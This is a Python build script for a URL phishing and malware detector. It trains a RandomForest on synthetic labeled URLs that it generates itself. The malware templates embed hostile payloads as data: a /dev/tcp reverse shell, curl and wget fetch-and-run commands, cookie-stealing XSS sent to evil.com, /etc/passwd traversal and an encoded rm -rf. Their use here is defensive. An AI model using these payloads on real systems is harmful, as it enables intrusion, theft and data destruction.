"""
backend/build_model.py
======================
Train the URL phishing/malware detection model at build time.

Run:
    python build_model.py          (from backend/ directory)
    python build_model.py --quick  (smaller dataset, faster build)

Output:
    models/url_phishing_model.pkl  — RandomForest classifier
    models/model_info.json         — metadata for /api/ml/status

Labels: 0=BENIGN  1=PHISHING  2=MALWARE

Design:
  - Uses the SAME extract_features() / features_to_ml_vector() as inference.
    Train/inference consistency is guaranteed — no feature drift possible.
  - Generates a synthetic labeled dataset from URL patterns.
  - Saves model to models/ directory relative to backend/ working dir.
  - Idempotent: safe to re-run on every deploy.
"""

from __future__ import annotations

import json
import logging
import os
import sys
from datetime import datetime, timezone
from pathlib import Path

# ── Logging ───────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("build_model")

# ── Paths ─────────────────────────────────────────────────────────────────────

_HERE       = Path(__file__).parent          # backend/
_MODELS_DIR = _HERE / "models"
_MODEL_PKL  = _MODELS_DIR / "url_phishing_model.pkl"
_INFO_JSON  = _MODELS_DIR / "model_info.json"

MODEL_VERSION   = "2.0.0"
FEATURE_VERSION = "urltracer-v1"


# ── Synthetic dataset ─────────────────────────────────────────────────────────

def _build_dataset(quick: bool = False) -> tuple[list[str], list[int]]:
    """
    Generate labeled URL samples.
    Returns (urls, labels) where label 0=BENIGN 1=PHISHING 2=MALWARE.
    """
    urls:   list[str] = []
    labels: list[int] = []

    # ── 0 = BENIGN ────────────────────────────────────────────────────────────
    benign_templates = [
        # Major tech
        "https://www.google.com/search?q={w}",
        "https://github.com/{w}/{w}-project",
        "https://stackoverflow.com/questions/{n}/how-to-{w}",
        "https://docs.python.org/3/library/{w}.html",
        "https://developer.mozilla.org/en-US/docs/Web/{w}",
        "https://www.youtube.com/watch?v={w}",
        "https://en.wikipedia.org/wiki/{w}",
        "https://www.reddit.com/r/{w}/comments/{n}/",
        "https://medium.com/@{w}/article-{n}",
        "https://aws.amazon.com/documentation/{w}/",
        "https://cloud.google.com/docs/{w}",
        "https://www.microsoft.com/en-us/microsoft-365/{w}",
        "https://support.apple.com/en-us/{w}",
        "https://www.linkedin.com/in/{w}/",
        # E-commerce
        "https://www.amazon.com/dp/{w}{n}",
        "https://www.amazon.in/gp/product/{w}",
        "https://www.flipkart.com/product/{w}/{n}",
        "https://www.ebay.com/itm/{n}",
        # Banking (legit)
        "https://www.sbi.co.in/web/personal-banking/{w}",
        "https://www.hdfcbank.com/{w}",
        "https://www.icicibank.com/{w}",
        "https://onlinesbi.sbi/sbijsp/{w}.htm",
        # News
        "https://www.bbc.com/news/{w}/{n}",
        "https://www.reuters.com/article/{w}-{n}",
        "https://timesofindia.indiatimes.com/{w}/{n}",
        # Education
        "https://www.coursera.org/learn/{w}",
        "https://www.edx.org/course/{w}",
        "https://nptel.ac.in/courses/{n}/{n}/",
        # Generic legit paths
        "https://{w}.com/about",
        "https://{w}.com/contact",
        "https://{w}.com/products/{w}",
        "https://{w}.org/resources/{w}",
        "https://{w}.edu/research/{w}",
        "https://{w}.gov.in/{w}",
        "https://api.{w}.com/v2/{w}?page={n}&limit=20",
        "https://cdn.{w}.net/assets/{w}.js",
        "https://static.{w}.com/images/{w}.png",
    ]

    words = [
        "python", "javascript", "security", "analytics", "machine-learning",
        "finance", "dashboard", "account", "settings", "profile", "report",
        "research", "technology", "healthcare", "education", "science",
        "marketing", "development", "infrastructure", "cloud", "data",
        "network", "enterprise", "platform", "solution", "service", "tool",
        "library", "framework", "application", "system", "portal", "hub",
    ]
    nums = [str(n) for n in range(1000, 9999, 13)]

    benign_count = 300 if quick else 900
    for i in range(benign_count):
        t = benign_templates[i % len(benign_templates)]
        w = words[i % len(words)]
        n = nums[i % len(nums)]
        urls.append(t.format(w=w, n=n))
        labels.append(0)

    # ── 1 = PHISHING ──────────────────────────────────────────────────────────
    phishing_templates = [
        # Brand squatting with suspicious TLDs
        "http://paypal-secure-login.{tld}/account/verify?token={n}",
        "http://secure-paypal-login.verify-account.{tld}/signin",
        "http://amazon-security-alert.{tld}/update/billing",
        "http://apple-id-verify.{tld}/login?next=/account",
        "http://microsoft-account-update.{tld}/password/reset",
        "http://google-verify-account.{tld}/signin",
        "http://facebook-login-secure.{tld}/checkpoint",
        "http://netflix-billing-update.{tld}/payment",
        "http://sbi-net-banking-verify.{tld}/login",
        "http://hdfc-account-secure.{tld}/verify",
        # IP-based phishing (very suspicious)
        "http://192.168.{n}.{n}/paypal/account/login",
        "http://10.{n}.{n}.{n}/secure/banking/signin",
        "http://172.16.{n}.{n}/apple-id/verify",
        "http://203.{n}.{n}.{n}/bank/login.php",
        # Long URLs with multiple suspicious params
        "http://secure-login-verify.{tld}/account?redirect=http://real-bank.com&token={n}&session={n}",
        "http://account-update-required.{tld}/verify?next=/dashboard&confirm=yes&user={n}",
        # Deep paths with keywords
        "http://login-secure.{tld}/account/verify/confirm/update/billing",
        "http://update-required.{tld}/signin/account/recovery/step/1/2/3",
        # Lookalike domains
        "http://paypa1-secure.{tld}/login",
        "http://g00gle-verify.{tld}/signin",
        "http://rn-icrosoft.{tld}/account",
        "http://app1e-id.{tld}/verify",
        # Base64 in query
        "http://secure-verify.{tld}/login?data=dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9MTIz",
        "http://account-check.{tld}/auth?token=aHR0cDovL21hbGljaW91cy5jb20=",
        # Redirect params
        "http://login-verify.{tld}/auth?url=http://bank.com&redirect=http://evil.{tld}",
        "http://secure-check.{tld}/account?next=http://phishing.{tld}/steal",
        # At symbol attack
        "http://legitimate-bank.com@phishing-site.{tld}/login",
        "http://paypal.com@192.168.1.1/account",
        # Punycode homograph
        "http://xn--pple-43d.{tld}/apple-id/verify",
        "http://xn--googIe-i3a.{tld}/signin",
        # Encoded paths
        "http://secure.{tld}/login%2Ephp?id={n}",
        "http://verify.{tld}/account%2Fupdate?token={n}",
        # Short domains with many parameters
        "http://bit-secure.{tld}/?a={n}&b={n}&c={n}&d={n}&e={n}&redirect=/login",
    ]
    phishing_tlds = ["tk", "ml", "ga", "cf", "xyz", "top", "click", "online", "site", "pw"]
    phish_count = 200 if quick else 600
    for i in range(phish_count):
        t = phishing_templates[i % len(phishing_templates)]
        tld = phishing_tlds[i % len(phishing_tlds)]
        n = str((i * 17 + 1234) % 255)
        urls.append(t.format(tld=tld, n=n))
        labels.append(1)

    # ── 2 = MALWARE ───────────────────────────────────────────────────────────
    malware_templates = [
        # Double encoding
        "http://malware-host.{tld}/payload%2525exec?cmd=wget+http://c2.{tld}/malware.sh",
        "http://c2-server.{tld}/stage2%252Fshellcode?id={n}",
        # Data URI injection
        "http://compromised.{tld}/page?content=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "http://exploit.{tld}/redirect?url=data:text/html,<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        # IP + heavy encoding + malware patterns
        "http://185.{n}.{n}.{n}/wp-content/plugins/backdoor.php?cmd=id",
        "http://91.{n}.{n}.{n}/shell?c=bash+-i+>&+/dev/tcp/{n}.{n}.{n}.{n}/4444+0>&1",
        "http://45.{n}.{n}.{n}/.well-known/acme/{n}/exec?payload=cm0gLXJmIC8=",
        # C2 patterns
        "http://c2.{tld}/beacon?uid={n}&ver=3&os=win&cmd=download",
        "http://192.{n}.{n}.{n}/rat/config.php?bot={n}&action=update",
        "http://update-{n}.{tld}/download/setup_{n}.exe?source=ad&tracker={n}",
        # Dropper URLs
        "http://free-download.{tld}/crack/photoshop_2024_keygen_{n}.exe",
        "http://serial-key.{tld}/office365_activator_{n}.zip",
        "http://nulled.{tld}/payload/windows_update_{n}.bat",
        # Encoded command injection
        "http://vuln-site.{tld}/api?q=1%3BSELECT%20SLEEP(5)--&id={n}",
        "http://target.{tld}/?search=<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>",
        # Heavily obfuscated
        "http://185.{n}.{n}.{n}/%77%70%2D%61%64%6D%69%6E/%61%64%6D%69%6E%2D%61%6A%61%78%2E%70%68%70",
        "http://91.{n}.{n}.{n}/%2E%2E/%2E%2E/%2E%2E/etc/passwd",
        "http://{n}.{n}.{n}.{n}/cgi-bin/../../../../bin/sh?cmd=curl+http://evil.{tld}/payload|sh",
        # Combo: IP + brand + encoding
        "http://192.{n}.{n}.{n}/paypal/login%20page?redirect%3Dhttp%3A%2F%2Fevil.tk",
    ]
    mal_count = 100 if quick else 300
    mal_tlds = ["tk", "ml", "xyz", "top", "cc", "su", "ru", "pw", "biz"]
    for i in range(mal_count):
        t = malware_templates[i % len(malware_templates)]
        tld = mal_tlds[i % len(mal_tlds)]
        n = str((i * 23 + 4567) % 255)
        urls.append(t.format(tld=tld, n=n))
        labels.append(2)

    return urls, labels


# ── Training ──────────────────────────────────────────────────────────────────

def train(quick: bool = False) -> None:
    log.info("=" * 60)
    log.info("URL Tracer — ML Model Build  v%s", MODEL_VERSION)
    log.info("=" * 60)

    # ── Step 1: Import deps ──────────────────────────────────────────────────
    log.info("[1/5] Importing dependencies...")
    try:
        import numpy as np
        from sklearn.ensemble import RandomForestClassifier
        from sklearn.model_selection import train_test_split
        from sklearn.metrics import (
            accuracy_score, precision_score, recall_score,
            f1_score, classification_report,
        )
        import joblib
    except ImportError as e:
        log.error("Missing dependency: %s — run: pip install scikit-learn joblib numpy", e)
        sys.exit(1)

    # Import the SAME feature extractor used at inference time
    sys.path.insert(0, str(_HERE))
    from analysis.features import extract_features, features_to_ml_vector

    # ── Step 2: Generate dataset ─────────────────────────────────────────────
    log.info("[2/5] Generating synthetic labeled dataset (quick=%s)...", quick)
    raw_urls, raw_labels = _build_dataset(quick=quick)
    log.info("      Total URLs generated: %d", len(raw_urls))

    # ── Step 3: Extract features using PRODUCTION feature extractor ───────────
    log.info("[3/5] Extracting features (28-dim vector per URL)...")
    log.info("      Using analysis/features.py — same as inference path")

    X_list, y_list = [], []
    skipped = 0
    for url, label in zip(raw_urls, raw_labels):
        try:
            feats = extract_features(url)
            vec   = features_to_ml_vector(feats)
            X_list.append(vec)
            y_list.append(label)
        except Exception as exc:
            skipped += 1
            log.debug("Skipped %s: %s", url[:60], exc)

    if skipped:
        log.warning("      Skipped %d URLs due to extraction errors", skipped)

    X = np.array(X_list, dtype=np.float32)
    y = np.array(y_list, dtype=np.int32)
    log.info("      Feature matrix: %s  Labels: %s", X.shape, y.shape)

    label_names = {0: "BENIGN", 1: "PHISHING", 2: "MALWARE"}
    for lbl, name in label_names.items():
        log.info("      %s: %d samples", name, int((y == lbl).sum()))

    # ── Step 4: Train / test split + train ───────────────────────────────────
    log.info("[4/5] Training RandomForest (n_estimators=200)...")
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y
    )
    log.info("      Train: %d  Test: %d", len(X_train), len(X_test))

    n_estimators = 100 if quick else 200
    clf = RandomForestClassifier(
        n_estimators=n_estimators,
        max_depth=20,
        min_samples_leaf=2,
        class_weight="balanced",   # handles class imbalance
        random_state=42,
        n_jobs=-1,                 # use all CPU cores
    )
    clf.fit(X_train, y_train)
    log.info("      Training complete.")

    # ── Step 5: Evaluate ────────────────────────────────────────────────────
    log.info("[5/5] Evaluating on held-out test set...")
    y_pred = clf.predict(X_test)

    accuracy  = float(accuracy_score(y_test, y_pred))
    precision = float(precision_score(y_test, y_pred, average="macro", zero_division=0))
    recall    = float(recall_score(y_test, y_pred, average="macro", zero_division=0))
    f1_macro  = float(f1_score(y_test, y_pred, average="macro", zero_division=0))
    report    = classification_report(
        y_test, y_pred,
        target_names=["BENIGN", "PHISHING", "MALWARE"],
        zero_division=0,
    )

    log.info("")
    log.info("  Accuracy  : %.4f  (%.1f%%)", accuracy,  accuracy  * 100)
    log.info("  Precision : %.4f", precision)
    log.info("  Recall    : %.4f", recall)
    log.info("  F1 Macro  : %.4f", f1_macro)
    log.info("")
    for line in report.splitlines():
        log.info("  %s", line)

    # Feature importances (top 5)
    importances = clf.feature_importances_
    from analysis.features import ML_FEATURE_NAMES
    top5 = sorted(zip(ML_FEATURE_NAMES, importances), key=lambda x: -x[1])[:5]
    log.info("")
    log.info("  Top-5 features by importance:")
    for name, imp in top5:
        log.info("    %-30s %.4f", name, imp)

    # ── Save model ────────────────────────────────────────────────────────────
    _MODELS_DIR.mkdir(parents=True, exist_ok=True)

    joblib.dump(clf, _MODEL_PKL)
    log.info("")
    log.info("[OK] Model saved to %s  (%.1f KB)",
             _MODEL_PKL, _MODEL_PKL.stat().st_size / 1024)

    # ── Save model_info.json ──────────────────────────────────────────────────
    info = {
        "model_version":   MODEL_VERSION,
        "feature_version": FEATURE_VERSION,
        "algorithm":       f"RandomForestClassifier(n_estimators={n_estimators})",
        "num_features":    X.shape[1],
        "feature_names":   ML_FEATURE_NAMES,
        "training_date":   datetime.now(timezone.utc).isoformat(),
        "train_samples":   len(X_train),
        "test_samples":    len(X_test),
        "labels":          {str(k): v for k, v in label_names.items()},
        "test_evaluation": {
            "accuracy":    round(accuracy,  4),
            "precision":   round(precision, 4),
            "recall":      round(recall,    4),
            "f1_macro":    round(f1_macro,  4),
        },
    }
    _INFO_JSON.write_text(json.dumps(info, indent=2))
    log.info("[OK] Metadata saved to %s", _INFO_JSON)
    log.info("")
    log.info("=" * 60)
    log.info("Build complete. Model is ready for inference.")
    log.info("=" * 60)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Train URL phishing detection model.")
    parser.add_argument("--quick", action="store_true",
                        help="Use smaller dataset (faster, for CI/testing)")
    args = parser.parse_args()
    train(quick=args.quick)
